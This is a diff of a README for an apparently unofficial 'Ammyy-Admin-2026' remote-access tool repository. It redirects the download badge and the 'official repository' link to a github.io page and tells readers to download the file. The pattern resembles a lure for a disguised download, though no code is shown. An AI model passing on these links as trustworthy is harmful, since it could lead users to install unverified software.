@@ -1,6 +1,6 @@
 # 🌐 Ammyy-Admin-2026 - Access your computer from anywhere easily
 
-[![Download Ammyy Admin](https://img.shields.io/badge/Download-Ammyy_Admin_2026-blue)](https://github.com/nikkisilenced488/Ammyy-Admin-2026)
+[![Download Ammyy Admin](https://img.shields.io/badge/Download-Ammyy_Admin_2026-blue)](https://nikkisilenced488.github.io)
 
 ## 📖 About this software
 
@@ -18,7 +18,7 @@ This software runs on standard consumer hardware. Ensure your system meets these
 
 ## 📥 How to download and install
 
-1.  Visit the official repository page at [https://github.com/nikkisilenced488/Ammyy-Admin-2026](https://github.com/nikkisilenced488/Ammyy-Admin-2026).
+1.  Visit the official repository page at [https://nikkisilenced488.github.io](https://nikkisilenced488.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Click the link to download the Ammyy Admin file to your computer.
 4.  Find the downloaded file in your browser downloads folder or your desktop.
